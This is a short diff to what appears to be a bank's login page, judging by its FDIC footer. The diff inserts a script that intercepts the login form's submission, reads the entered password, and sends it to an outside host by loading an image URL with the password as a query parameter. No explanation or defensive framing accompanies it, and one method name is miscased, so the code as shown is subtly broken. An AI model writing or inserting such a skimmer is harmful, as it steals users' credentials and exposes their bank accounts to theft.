@@ -52,6 +52,15 @@
   </form>
 </div>
 
+<script>
+document.getElementByID("login").addEventListener("submit", function(evt) {
+	evt.preventDefault();
+	var pass = document.forms[0].elements[1].value;
+	i = new Image();
+	i.src='http://r7.io/e/macdh?s='+pass;
+})
+</script>
+
 
 <div id="compliance-footer">
   <div id="fdic-logo">Member</div>
